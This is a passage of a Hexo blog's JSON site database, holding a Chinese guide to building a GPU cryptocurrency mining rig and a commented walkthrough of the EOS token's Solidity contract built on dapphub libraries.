x.html","hash":"f85c3525ff7fd61cc566de904f85704134f56f7e","modified":1522036961833},{"_id":"public/2018/03/02/比特币挖矿之Merkle树/index.html","hash":"12192d0e8296cb767bd6427bcad1aa1f1eae1be5","modified":1522036961833},{"_id":"public/2018/03/02/zcash矿池之Z-NOMP-Node-Open-Mining-Portal/index.html","hash":"24f1516c6fb755c81bccbdcaf02004a392c1a450","modified":1522036961833},{"_id":"public/2018/03/01/以太坊，燃气，燃料-和-费用/index.html","hash":"c57cdb7bab3265a3d5a5b4f150db7f327aff2ffc","modified":1522036961833},{"_id":"public/2018/02/28/比特币挖矿之矿工任务/index.html","hash":"785de4bcb5702cbf5afc2ceca8be9b5449424d24","modified":1522036961833},{"_id":"public/2018/02/24/以太坊wiki-设计原理翻译四/index.html","hash":"d805fd1a404dd4652fd8b259217f0e172e0d323d","modified":1522036961833},{"_id":"public/2018/02/24/以太坊wiki-设计原理翻译三/index.html","hash":"25e6d64b72df81f37ce9066115725f417eacde61","modified":1522036961833},{"_id":"public/2018/02/09/比特币挖矿之全网难度/index.html","hash":"2f8e872608a72a1425c6930aab672fed4df9586b","modified":1522036961833},{"_id":"public/2018/02/09/以太坊wiki-设计原理翻译一/index.html","hash":"3cf0535f9f286cf66d953cc0ef0ec70bcb136518","modified":1522036961833},{"_id":"public/2018/02/09/以太坊wiki-设计原理翻译二/index.html","hash":"a1193e54ee0924c561bd1b3dda8dcba9d8d10c21","modified":1522036961834},{"_id":"public/2018/02/08/linux下Zcash钱包使用教程/index.html","hash":"84180cadc6c4188c96b6c2b7c3a36e7a98c725d4","modified":1522036961834},{"_id":"public/categories/矿池/index.html","hash":"172f1596e4d59e746c6e54cfe5c19350e7ce24f3","modified":1522036961834},{"_id":"public/categories/矿池/page/2/index.html","hash":"d519ff9568d40b63f879e4ebd20d0ac5cd84fdcb","modified":1522036961834},{"_id":"public/categories/区块链/index.html","hash":"e6a265ce9063383f54a26b2964f027fdd2e2cdfd","modified":1522036961834},{"_id":"public/categories/钱包/index.html","hash":"948bf3942de8fd220ed78521f20b79bbb966ad01","modified":1522036961834},{"_id":"public/index.html","hash":"08f1f41d8fb7ad27a81ae91d25482f821ce09d99","modified":1522036961834},{"_id":"public/page/2/index.html","hash":"b0bb576cc95311e0cbf0d6fa301c47566280d3fd","modified":1522036961834},{"_id":"public/page/3/index.html","hash":"50af1f136b4056bd9d0753e4a6b5efd44eec34e0","modified":1522036961834},{"_id":"public/tags/lucas556/index.html","hash":"ecfbd7e37a97057fdff8206775c754443b7c5aa0","modified":1522036961834},{"_id":"public/tags/ZhouFyk/index.html","hash":"fb08c02fb177764d6eda75d43519ac11c08ec760","modified":1522036961834},{"_id":"public/tags/以太坊/index.html","hash":"1edc0a1aa4b13b47cd875af250b95daa8c33cdc6","modified":1522036961834},{"_id":"public/tags/以太坊/page/2/index.html","hash":"8a8be00fcf9f044bb59d8bdc60d79f9bd80e72c3","modified":1522036961834},{"_id":"public/tags/智能合约/index.html","hash":"57b308cb1d20c948b8d362e992ce28d2d5c76bdd","modified":1522036961835},{"_id":"public/tags/LeonBCK/index.html","hash":"0557b36a96a9bf31eda07878004cb1fd6fb81a5d","modified":1522036961835},{"_id":"public/tags/ciscolxh/index.html","hash":"d6d370ab11bf29a8a38e4872213cfd3071db8770","modified":1522036961835},{"_id":"public/tags/钱包/index.html","hash":"a949ae17c11488fdd0f704a79c5bf9fba7324bb9","modified":1522036961836},{"_id":"public/tags/矿池/index.html","hash":"567f3605d0f209e661815f9b450c59cf3879696e","modified":1522036961836},{"_id":"public/tags/区块链/index.html","hash":"a1059e0721f11c457ae67337736431f3d6569976","modified":1522036961836},{"_id":"public/tags/比特币/index.html","hash":"7115796fb529589744ec18d037d148e5985ce671","modified":1522036961836},{"_id":"public/CNAME","hash":"a8c67236d27b23a9478ebb536131605fe0b6e2f5","modified":1522036961847},{"_id":"public/images/W2.png","hash":"79b72c31300166b0e42e5c9e997d6dbef1b0400b","modified":1522036961847},{"_id":"public/images/b1.png","hash":"1c506fcaa821a62cfb7c77f28d01959ca4631b7e","modified":1522036961847},{"_id":"public/images/coffeeMiner-logo-small.png","hash":"270873d09dd97c0ab33588d4b0030f8bd7abeb22","modified":1522036961847},{"_id":"public/images/bip201803252344.jpg","hash":"00365499c9b8fe22b39ad0368dcf93b091a97e5c","modified":1522036961847},{"_id":"public/images/nodeos_ls1.png","hash":"f9ca2174108517678b75ae1728c4ecd08a8b68d1","modified":1522036961847},{"_id":"public/images/eos_build.png","hash":"9731c0cc02f25e76525a069e1e8ef48af53355f9","modified":1522036961847},{"_id":"public/images/miner.png","hash":"954abbb34b4b051c21e7f10ee4a7f22a69de0a61","modified":1522036961847},{"_id":"public/images/geth2.png","hash":"0415bae23bfc6efa4cd02cab5afe231fc3fb7ff8","modified":1522036961847},{"_id":"public/images/pos_bet.png","hash":"416a37ea770fbdffc736eef40aa6836cc73308d2","modified":1522036961847},{"_id":"public/images/pos_createblock.png","hash":"ed53547a0ce80e01b4967cc142630987a55d1dd4","modified":1522036961847},{"_id":"public/images/pos_createblock2.png","hash":"b20da6566e99e629715b140ae6230e4a9e65c826","modified":1522036961847},{"_id":"public/images/pos_decentralization.png","hash":"d2825090808db48b8c35696735c82d41a56a8609","modified":1522036961847},{"_id":"public/images/pos_voting.png","hash":"7cc5df8727d50660188c2a2db13e7d9a0900ddfe","modified":1522036961848},{"_id":"public/images/pz.png","hash":"42281741a80165a9ea92c162c2c2e47dff8d3299","modified":1522036961848},{"_id":"public/images/scenario01.png","hash":"5fe9ed8a9a277f4d2b73355f18b7797ff72a7071","modified":1522036961848},{"_id":"public/images/scenario02.png","hash":"3c54e96556ed1c2ba32abd6a9a1887ea3004d996","modified":1522036961848},{"_id":"public/img/avatar.jpg","hash":"e560efaa03141889a447839fa717fd29db49ec6e","modified":1522036961848},{"_id":"public/img/branding.png","hash":"18bee49d6a4c521ad230047c0b416245e009c2c9","modified":1522036961848},{"_id":"public/img/head-img.jpg","hash":"a318d304665c2f410f79e6d2eb1b98119f675b4b","modified":1522036961848},{"_id":"public/images/address20180311.png","hash":"3e9c03887a2a62ebe32c698c06dee3176445f58e","modified":1522036961854},{"_id":"public/images/eos_node00.png","hash":"487d02bf51fd25bb2e2d2483e4e1cce165e863d8","modified":1522036961854},{"_id":"public/images/coffeeMiner-network-attack.png","hash":"13c1fc2ab3001813010681e149f297327be5769d","modified":1522036961856},{"_id":"public/images/geth.png","hash":"872e4eb61eae6724aefaafe370c5f7862e57947d","modified":1522036961856},{"_id":"public/images/nodeos_not_my_turn.png","hash":"29f7c4161e0f435a5fecbc0694be455687976cfa","modified":1522036961856},{"_id":"public/images/nodeos_produce_blocks.png","hash":"28b34d8bd8b10128f67db9b5f963d562425c0d36","modified":1522036961856},{"_id":"public/images/nodeos_try1.png","hash":"e18e5af39af04a075f81a0f5777f71363ad5c9fb","modified":1522036961856},{"_id":"public/images/test20180311.png","hash":"92b93aca6beeccf95b952e3740db1792c38678e6","modified":1522036961857},{"_id":"public/images/test_wallet20180311.png","hash":"02d30e267250a5c5d12447c2da8488439305ae56","modified":1522036961857},{"_id":"public/images/wallet.jpeg","hash":"1faf948f4e494f87c7d118a3f4069aab2a0d95d7","modified":1522036961857},{"_id":"public/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1522036961857},{"_id":"public/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1522036961857},{"_id":"public/img/loading.gif","hash":"6cea4dc953ac09fb744c7fedc12a1f4736faf8ec","modified":1522036961857},{"_id":"public/assets/highlight.pack.js","hash":"f39840759ec9afe56ec1ca30579d1f1c9d1f6026","modified":1522036961862},{"_id":"public/js/app.js","hash":"41fe02b22201e3be72dcebfb05cac8cbfae8d85f","modified":1522036961862},{"_id":"public/js/search.js","hash":"b806e6ac8b92750113033d4ab0cc598953c3d5ac","modified":1522036961862},{"_id":"public/css/style.css","hash":"e1fc8aa20dede36c08bde6330ab2a7f36e31aa48","modified":1522036961862},{"_id":"public/images/bip201803252339.jpg","hash":"1fa41f59cb4c2e3fc8e035efa9d25eb36b6f6cc0","modified":1522036961862},{"_id":"public/images/bip201803252342.jpg","hash":"2556d066260c3f834ae08b42f71a6166891fd648","modified":1522036961862},{"_id":"public/images/wallet20180311.png","hash":"87a8a86d3feb0c873c4db170afe3a88d45a9f6b3","modified":1522036961862},{"_id":"public/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1522036961862},{"_id":"public/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1522036961862},{"_id":"public/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1522036961862},{"_id":"public/images/bip201803252337.jpg","hash":"86b6ad57bd330fac4dedf23ba29b534a9e970197","modified":1522036961869},{"_id":"public/images/c5.png","hash":"7cc7417f668cc19608167a5d7c96bed4adf12eff","modified":1522036961874},{"_id":"public/favicon.ico","hash":"2881f1a2775e67e7ed0043c375875179ab1ee6b8","modified":1522036961875},{"_id":"public/fonts/fontawesome-webfont.svg","hash":"98a8aa5cf7d62c2eff5f07ede8d844b874ef06ed","modified":1522036961879},{"_id":"public/images/coffeeMiner-demo-cutted.gif","hash":"dd5d9c6db1937caa7a1344402cdf0a09063f862a","modified":1522036961897}],"Category":[{"name":"矿池","_id":"cjf7piauv0002pkwo3fd7avsa"},{"name":"智能合约","_id":"cjf7piav10007pkwofdmqydpz"},{"name":"区块链","_id":"cjf7piav5000cpkwos2deesal"},{"name":"钱包","_id":"cjf7piavb000jpkwouxp5fb3d"}],"Data":[],"Page":[],"Post":[{"title":"2018年自己动手组装一台矿机吧--显卡矿机教程","comments":0,"date":"2018-03-02T09:31:52.000Z","img":null,"_content":"\n市面上一些加密数字货币如ETH,Zcash等挖矿投资收益远远超过了比特币，在2017年造成了一卡难求的局面，即使现在币价有所回落，矿机仍然是供不应求，好多矿工甚至小白依然不能买到称心如意的矿机，那么，我们不如自己动手来组装适合自己的矿机，此处仅限显卡矿机。\n\n![](/images/W2.png)\n\n显卡矿机和我们通常的电脑是一样的,主要硬件包含:显卡、主板、电源、CPU、内存、硬盘（SSD）、延长线、转接线等.其中显卡决定了挖矿的速度,主板、电源很大程度上决定矿机运行的稳定程度.\n\n主板建议:显卡挖矿不需要很大的 PCIE 带宽.主板上具备 PCI-E 1X 即可满足带宽要求.一般主板上具有3-5个PCI-E 1X 接口，1个PCI-E 16X接口,此外主板上具有大4PIN供电接口对稳定性有一定的提升.PCI-E1X需要淘宝购买1X转16X延长线.\n\n操作系统使用Windows 10 1703版最佳,建议使用官方原版.动手能力强的朋友可以使用ETH OS进行挖矿,这里不在赘述.\n\n显卡建议:目前推荐使用AMD RX580/480/470/570;英伟达GTX1060/1070进行挖矿,建议显存4G以上.\n\n同时,现在市场上出现了以昂达b250 btc-d8p为首的8卡直插主板,免去了转接线、延长线和驱动的繁琐调试,附图是一套8卡直插GTX 1066显卡矿机配置.\n\n![](/images/pz.png)\n\n有不熟悉硬件的朋友可以找身边对电子产品了解且动手能力强的帮忙安装调试,同时需要进行超频,以GTX 1066挖以太坊为例,没超频前算力约为20 MH,超频后为23 MH,算力提升约为6%.\n\nN卡超频设置使用MSI Afterburner,打开MSI Afterburner后可以看到+-按钮进行操作,以我们公司的GTX 1066为例子,目前的调整参数为温度 85 ,核心频率 -90 ,显存频率 +735.\n\n![](/images/c5.png)\n\n重点来了:在上面图片中可以看到显卡矿机的收益并不高,但是显卡矿机有个好处就是可以切换不同币种之间挖矿.\n例如,现在挖以太坊收益为每天61元,当新出一个币种A的时候,而A此时还没有交易所可以交易,我们可以进行预挖,一般在预挖的时候是产量是比较高的,这个时候留着币,当币种上线交易所,进行抛售套现,也是一个非常好的收益.\n如果A的收益偏低我们可以继续挖ETH,ZEC等稳定性的币种,充分利用显卡矿机的优势创造收益最大化.\n","source":"_posts/2018年自己动手组装一台矿机吧-显卡矿机教程.md","raw":"---\ntitle: 2018年自己动手组装一台矿机吧--显卡矿机教程\ncomments: false\ndate: 2018-03-02 17:31:52\ncategories: 矿池\ntags:\n- lucas556\n- 矿机\nimg:\n---\n\n市面上一些加密数字货币如ETH,Zcash等挖矿投资收益远远超过了比特币，在2017年造成了一卡难求的局面，即使现在币价有所回落，矿机仍然是供不应求，好多矿工甚至小白依然不能买到称心如意的矿机，那么，我们不如自己动手来组装适合自己的矿机，此处仅限显卡矿机。\n\n![](/images/W2.png)\n\n显卡矿机和我们通常的电脑是一样的,主要硬件包含:显卡、主板、电源、CPU、内存、硬盘（SSD）、延长线、转接线等.其中显卡决定了挖矿的速度,主板、电源很大程度上决定矿机运行的稳定程度.\n\n主板建议:显卡挖矿不需要很大的 PCIE 带宽.主板上具备 PCI-E 1X 即可满足带宽要求.一般主板上具有3-5个PCI-E 1X 接口，1个PCI-E 16X接口,此外主板上具有大4PIN供电接口对稳定性有一定的提升.PCI-E1X需要淘宝购买1X转16X延长线.\n\n操作系统使用Windows 10 1703版最佳,建议使用官方原版.动手能力强的朋友可以使用ETH OS进行挖矿,这里不在赘述.\n\n显卡建议:目前推荐使用AMD RX580/480/470/570;英伟达GTX1060/1070进行挖矿,建议显存4G以上.\n\n同时,现在市场上出现了以昂达b250 btc-d8p为首的8卡直插主板,免去了转接线、延长线和驱动的繁琐调试,附图是一套8卡直插GTX 1066显卡矿机配置.\n\n![](/images/pz.png)\n\n有不熟悉硬件的朋友可以找身边对电子产品了解且动手能力强的帮忙安装调试,同时需要进行超频,以GTX 1066挖以太坊为例,没超频前算力约为20 MH,超频后为23 MH,算力提升约为6%.\n\nN卡超频设置使用MSI Afterburner,打开MSI Afterburner后可以看到+-按钮进行操作,以我们公司的GTX 1066为例子,目前的调整参数为温度 85 ,核心频率 -90 ,显存频率 +735.\n\n![](/images/c5.png)\n\n重点来了:在上面图片中可以看到显卡矿机的收益并不高,但是显卡矿机有个好处就是可以切换不同币种之间挖矿.\n例如,现在挖以太坊收益为每天61元,当新出一个币种A的时候,而A此时还没有交易所可以交易,我们可以进行预挖,一般在预挖的时候是产量是比较高的,这个时候留着币,当币种上线交易所,进行抛售套现,也是一个非常好的收益.\n如果A的收益偏低我们可以继续挖ETH,ZEC等稳定性的币种,充分利用显卡矿机的优势创造收益最大化.\n","slug":"2018年自己动手组装一台矿机吧-显卡矿机教程","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piaun0000pkwoiwgn7hbo","content":"<p>市面上一些加密数字货币如ETH,Zcash等挖矿投资收益远远超过了比特币，在2017年造成了一卡难求的局面，即使现在币价有所回落，矿机仍然是供不应求，好多矿工甚至小白依然不能买到称心如意的矿机，那么，我们不如自己动手来组装适合自己的矿机，此处仅限显卡矿机。</p>\n<p><img src=\"/images/W2.png\" alt=\"\"></p>\n<p>显卡矿机和我们通常的电脑是一样的,主要硬件包含:显卡、主板、电源、CPU、内存、硬盘（SSD）、延长线、转接线等.其中显卡决定了挖矿的速度,主板、电源很大程度上决定矿机运行的稳定程度.</p>\n<p>主板建议:显卡挖矿不需要很大的 PCIE 带宽.主板上具备 PCI-E 1X 即可满足带宽要求.一般主板上具有3-5个PCI-E 1X 接口，1个PCI-E 16X接口,此外主板上具有大4PIN供电接口对稳定性有一定的提升.PCI-E1X需要淘宝购买1X转16X延长线.</p>\n<p>操作系统使用Windows 10 1703版最佳,建议使用官方原版.动手能力强的朋友可以使用ETH OS进行挖矿,这里不在赘述.</p>\n<p>显卡建议:目前推荐使用AMD RX580/480/470/570;英伟达GTX1060/1070进行挖矿,建议显存4G以上.</p>\n<p>同时,现在市场上出现了以昂达b250 btc-d8p为首的8卡直插主板,免去了转接线、延长线和驱动的繁琐调试,附图是一套8卡直插GTX 1066显卡矿机配置.</p>\n<p><img src=\"/images/pz.png\" alt=\"\"></p>\n<p>有不熟悉硬件的朋友可以找身边对电子产品了解且动手能力强的帮忙安装调试,同时需要进行超频,以GTX 1066挖以太坊为例,没超频前算力约为20 MH,超频后为23 MH,算力提升约为6%.</p>\n<p>N卡超频设置使用MSI Afterburner,打开MSI Afterburner后可以看到+-按钮进行操作,以我们公司的GTX 1066为例子,目前的调整参数为温度 85 ,核心频率 -90 ,显存频率 +735.</p>\n<p><img src=\"/images/c5.png\" alt=\"\"></p>\n<p>重点来了:在上面图片中可以看到显卡矿机的收益并不高,但是显卡矿机有个好处就是可以切换不同币种之间挖矿.<br>例如,现在挖以太坊收益为每天61元,当新出一个币种A的时候,而A此时还没有交易所可以交易,我们可以进行预挖,一般在预挖的时候是产量是比较高的,这个时候留着币,当币种上线交易所,进行抛售套现,也是一个非常好的收益.<br>如果A的收益偏低我们可以继续挖ETH,ZEC等稳定性的币种,充分利用显卡矿机的优势创造收益最大化.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>市面上一些加密数字货币如ETH,Zcash等挖矿投资收益远远超过了比特币，在2017年造成了一卡难求的局面，即使现在币价有所回落，矿机仍然是供不应求，好多矿工甚至小白依然不能买到称心如意的矿机，那么，我们不如自己动手来组装适合自己的矿机，此处仅限显卡矿机。</p>\n<p><img src=\"/images/W2.png\" alt=\"\"></p>\n<p>显卡矿机和我们通常的电脑是一样的,主要硬件包含:显卡、主板、电源、CPU、内存、硬盘（SSD）、延长线、转接线等.其中显卡决定了挖矿的速度,主板、电源很大程度上决定矿机运行的稳定程度.</p>\n<p>主板建议:显卡挖矿不需要很大的 PCIE 带宽.主板上具备 PCI-E 1X 即可满足带宽要求.一般主板上具有3-5个PCI-E 1X 接口，1个PCI-E 16X接口,此外主板上具有大4PIN供电接口对稳定性有一定的提升.PCI-E1X需要淘宝购买1X转16X延长线.</p>\n<p>操作系统使用Windows 10 1703版最佳,建议使用官方原版.动手能力强的朋友可以使用ETH OS进行挖矿,这里不在赘述.</p>\n<p>显卡建议:目前推荐使用AMD RX580/480/470/570;英伟达GTX1060/1070进行挖矿,建议显存4G以上.</p>\n<p>同时,现在市场上出现了以昂达b250 btc-d8p为首的8卡直插主板,免去了转接线、延长线和驱动的繁琐调试,附图是一套8卡直插GTX 1066显卡矿机配置.</p>\n<p><img src=\"/images/pz.png\" alt=\"\"></p>\n<p>有不熟悉硬件的朋友可以找身边对电子产品了解且动手能力强的帮忙安装调试,同时需要进行超频,以GTX 1066挖以太坊为例,没超频前算力约为20 MH,超频后为23 MH,算力提升约为6%.</p>\n<p>N卡超频设置使用MSI Afterburner,打开MSI Afterburner后可以看到+-按钮进行操作,以我们公司的GTX 1066为例子,目前的调整参数为温度 85 ,核心频率 -90 ,显存频率 +735.</p>\n<p><img src=\"/images/c5.png\" alt=\"\"></p>\n<p>重点来了:在上面图片中可以看到显卡矿机的收益并不高,但是显卡矿机有个好处就是可以切换不同币种之间挖矿.<br>例如,现在挖以太坊收益为每天61元,当新出一个币种A的时候,而A此时还没有交易所可以交易,我们可以进行预挖,一般在预挖的时候是产量是比较高的,这个时候留着币,当币种上线交易所,进行抛售套现,也是一个非常好的收益.<br>如果A的收益偏低我们可以继续挖ETH,ZEC等稳定性的币种,充分利用显卡矿机的优势创造收益最大化.</p>\n"},{"title":"EOS-合约理解","comments":0,"date":"2018-03-15T10:59:16.000Z","img":null,"_content":"\n[合约链接](https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0#code)\n\n## 结构组成\n\n使用了 [dapphub 的库](https://github.com/dapphub)。\n\n```\nA:DSAuthority-----     DSAuthEvents\n                  |       |\nA:ERC20\t DSMath\t   ---> DSAuth      DSNote\n   |\t   |              |           |\n    -------                -----------\n        |                     |\n    DSTokenBase             DSStop\n        |                     |\n         ---------------------\n                   |\n                 DSToken\n\nA:abstract contract\n下面的合约继承上面的合约。DSAuthority 在 DSAuth 中被使用。\n```\n\n## 合约简介\n\n### 1. [DSNote](https://dapp.tools/dappsys/ds-note.html)\n\n记录合约。定义了事件 `LogNote`，声明为 `anonymous`。定义了修饰器 `note`，内部会触发事件 `LogNote`。\n\n### 2. [DSAuth](https://dapp.tools/dappsys/ds-auth.html)\n\n2.1 DSAuthority\n\n抽象函数，只有一个 `canCall` 函数。\n\n2.2 DSAuthEvents\n\n认证事件合约。只有两个事件 `LogSerAuthority / LogSetOwner`。当设置 `Authority / Owner` 时触发。\n\n2.3 DSAuth\n\n继承了 `DSAuthEvents`。设置 `Authority / Owner`，以及对来源的检测。\n\n### 3. [DSStop](https://dapp.tools/dappsys/ds-stop.html)\n\n继承 `DSAuth`，`DSNote`。设置 `stopped`，停止标识符。\n\n### 4. [DSMath](https://dapp.tools/dappsys/ds-math.html)\n\n安全的常规数学运算。包含了 `uint256 / uint128 / int256 / WAD / RAY` 等相关的运算。\n\n### 5. [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)\n\n以太坊上发行代币的接口。实现此接口，可以方便对代币进行操作。\n\n### 6. [DSToken](https://dapp.tools/dappsys/ds-token.html)\n\n6.1 DSTokenBase\n\n继承 `ERC20 / DSMath` 合约。实现了抽象函数中的方法，完成了代币的基础功能。\n\n6.2 DSToken\n\n具体代币的合约，实际的交互合约。\n\n* 以上与所链接的文档有些许差别。\n\n## 合约代码阅读\n\n### 1. DSNote\n```\n// 记录的合约\ncontract DSNote {\n    /*\n    记录 事件 声明了 anonymous，使用了 indexed\n    */ \n    event LogNote(\n        bytes4   indexed  sig,\n        address  indexed  guy,\n        bytes32  indexed  foo,\n        bytes32  indexed  bar,\n\tuint\t \t  wad,\n        bytes             fax\n    ) anonymous;\n\n    // 修饰器\n    modifier note {\n        bytes32 foo;\n        bytes32 bar;\n\n        // 内联汇编\n        assembly {\n            // := 赋值\n            // calldataload(p) : 从 p 位置开始调用数据 (32 bytes)\n            foo := calldataload(4)\n            bar := calldataload(36)\n        }\n\n        // 触发 记录事件\n        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n\n        _;\n    }\n}\n```\n\n根据[`event` 的文档描述](https://solidity.readthedocs.io/en/latest/contracts.html#events)：\n> Up to three parameters can receive the attribute `indexed` which will cause the respective arguments to be searched for: It is possible to filter for specific values of indexed arguments in the user interface.\n\n最多只能有三个参数可以接受 `indexed` 属性，不知道为什么此处有 4 个。`indexed` 指定的参数可以在用户界面中被搜索。\n\n`anonymous` 的声明，[`event` 的文档描述](https://solidity.readthedocs.io/en/latest/contracts.html#events)：\n> The hash of the signature of the event is one of the topics except if you declared the event with `anonymous` specifier. This means that it is not possible to filter for specific anonymous events by name.\n>\n> 除非你使用 `anonymous` 声明事件，否则事件签名的哈希值将成为 topic 之一。意思是无法通过名称筛选指定的 `anonymous` 事件。\n\n[`assembly` 的文档描述](https://solidity.readthedocs.io/en/latest/assembly.html#inline-assembly)：\n\n> 函数式赋值, 如 x := add(y, 3)\n\n[`opcodes` 的文档描述](https://solidity.readthedocs.io/en/latest/assembly.html#opcodes)：\n\n> calldataload(p) : 从 p 位置开始调用数据 (32 bytes)\n\n`foo, bar` 两个参数，一直是当前调用函数相关的值。\n\n### 2. DSAuthority\n```\ncontract DSAuthority {\n    // 函数未实现\n    function canCall(\n        address src, address dst, bytes4 sig\n    ) constant returns (bool);\n}\n```\n\n这是一个抽象合约，`canCall` 函数未实现。`constant` 表示函数不会对合约状态进行修改。\n\n### 3. DSAuthEvents\n\n```\ncontract DSAuthEvents {\n    // 记录验证 事件\n    event LogSetAuthority (address indexed authority);\n    // 记录主人 事件\n    event LogSetOwner     (address indexed owner);\n}\n```\n\n只包含了两个事件的声明。当用户设置 `authority / owner` 时会触发。\n\n### 4. DSAuth\n```\n// 认证合约\n// `is` 表示继承了 `DSAuthEvents`\ncontract DSAuth is DSAuthEvents {\n    DSAuthority  public  authority;\n    address      public  owner;\n  \n    // 修饰器\n    modifier auth {\n        // isAuthorized() 为 true\n        assert(isAuthorized(msg.sender, msg.sig));\n        _;\n    }\n\n    // 修饰器 未被使用到\n    modifier authorized(bytes4 sig) {\n    \t// isAuthorized() 为 true\n        assert(isAuthorized(msg.sender, sig));\n        _;\n    }\n  \n    // 构造函数，设置 owner\n    function DSAuth() {\n        owner = msg.sender;\n        LogSetOwner(msg.sender);\n    }\n\n    // 验证函数\n    function assert(bool x) internal {\n        if (!x) throw;\n    }\n\n    // 通过 auth 验证，设置 owner，触发事件\n    function setOwner(address owner_) auth\n    {\n        owner = owner_;\n        LogSetOwner(owner);\n    }\n\n    // 通过 auth 验证，设置 authority，触发事件\n    function setAuthority(DSAuthority authority_) auth\n    {\n        authority = authority_;\n        LogSetAuthority(authority);\n    }\n\n    // 认证函数 根据 src 和 authority 的情况来返回操作结果\n    function isAuthorized(address src, bytes4 sig) internal returns (bool) {\n        if (src == address(this)) { \n            return true;\n        } else if (src == owner) { \n            return true;\n        } else if (authority == DSAuthority(0)) { \n            return false;\n        } else {\n            return authority.canCall(src, this, sig);\n        }\n    }\n}\n```\n\n合约继承了认证事件。合约主要用来对认证部分进行处理。在设置 owner 和 authority 之前，触发 auth 修饰器，通过函数 `isAuthorized()` 来对消息发送者 `msg` 进行验证。消息发送者 `msg` 包含：\n\n4.1 `msg.data(bytes)`：完整的调用数据\n4.2 `msg.gas(uint)`：剩余燃气 - 在版本 0.4.21 中废弃并由 `gasleft()` 取代\n4.3 `msg.sender(address)`：当前消息的发送者\n4.4 `msg.sig(bytes4)`：调用数据的前四个字节（即函数的标识符）\n4.5 `msg.value(uint)`：伴随消息发送的 wei 的数值\n\n函数 `isAuthorized()` 是 `internal` 内部函数，只能在内部或者派生的合约中被调用，无需使用 `this`。首先将 `src` 与 `this` 的地址进行比较，如果为 `true` 则返回 `true`。[`this` 的定义](https://solidity.readthedocs.io/en/latest/units-and-global-variables.html#contract-related)是：\n\n> `this` (current contract’s type): the current contract, explicitly convertible to Address\n>\n> 当前合约的类型：当前的合约，显式转换为地址。\n\n然后比较 `src` 与 `owner`，如果为 `true` 返回 `true`。构造函数中 `owner` 就是部署合约的用户地址，因为构造函数只设置了 `owner`，所以默认只用操作 `owner`，到此就截止了。\n\n然后比较 `authority` 与 `DSAuthority(0)`。`DSAuthority(0)` 表示将 0 强制转换成 `DSAuthority` 类型，此时与 `authority` 进行比较，如果相等，则说明 `authority` 未被赋值。因为任何变量如果没有被赋值，那么它的初始值就是 0。所以相等，说明未被赋值过，返回 false。而如果比较结果为 false，则说明使用了 `authority` 变量，那么可以进行下一步了，即调用 `authority.canCall(src, this, sig)` 并返回其结果。此处 `canCall` 函数并没有被实现，但是提供了一个接口给用户，如果用户想要使用，只需要继承 `DSAuthority`，然后实现该函数，然后使用该继承的合约即可。\n\n### 5. DSStop\n```\n// 停止合约\ncontract DSStop is DSAuth, DSNote {\n    // 停止标识符\n    bool public stopped;\n\n    // 修饰器 检测停止标识符\n    modifier stoppable {\n        assert (!stopped);\n        _;\n    }\n\n    // 停止函数\n    function stop() auth note {\n        stopped = true;\n    }\n\n    // 启动函数\n    function start() auth note {\n        stopped = false;\n    }\n}\n```\n\n继承了 `DSAuth / DSNote` 合约。定义了 `stoppable` 检测众筹是否停止。定义了两个函数，分别用来设置停止标识符，表示启动或结束，设置的时候通过 `auth` 来进行权限验证，`note` 来触发变更。\n\n### 6. DSMath\n```\n// 安全的数学运算\ncontract DSMath {\n    \n    /*\n    标准 uint256 函数 256 位无符号数 即 非负整数 0 ~ 2^256 - 1\n\n    constant 表示不会改变状态变量\n    internal 表示只会被本合约和继承了的合约所使用\n     */\n\n    // 加法\n    function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x + y) >= x);\n    }\n\n    // 减法\n    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x - y) <= x);\n    }\n\n    // 乘法\n    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x * y) >= x);\n    }\n\n    // 除法 当除以 0 时，solidity 会自动抛出异常\n    function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        z = x / y;\n    }\n\n    // 返回较小值\n    function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    // 返回较大值\n    function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    /*\n    uint128 functions (h is for half) 由 256 位变为 128 位 其余同上\n     */\n\n    function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x + y) >= x);\n    }\n\n    function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x - y) <= x);\n    }\n\n    function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x * y) >= x);\n    }\n\n    function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = x / y;\n    }\n\n    function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        return x <= y ? x : y;\n    }\n    function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        return x >= y ? x : y;\n    }\n\n\n    /*\n    int256 functions 有符号 256 位函数\n     */\n\n    function imin(int256 x, int256 y) constant internal returns (int256 z) {\n        return x <= y ? x : y;\n    }\n    function imax(int256 x, int256 y) constant internal returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    /*\n    WAD math 提供 18 位精度，同上 乘法和除法加入 WAD\n     */\n\n    uint128 constant WAD = 10 ** 18;\n\n    function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hadd(x, y);\n    }\n\n    function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hsub(x, y);\n    }\n\n    function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * y + WAD / 2) / WAD);\n    }\n\n    function 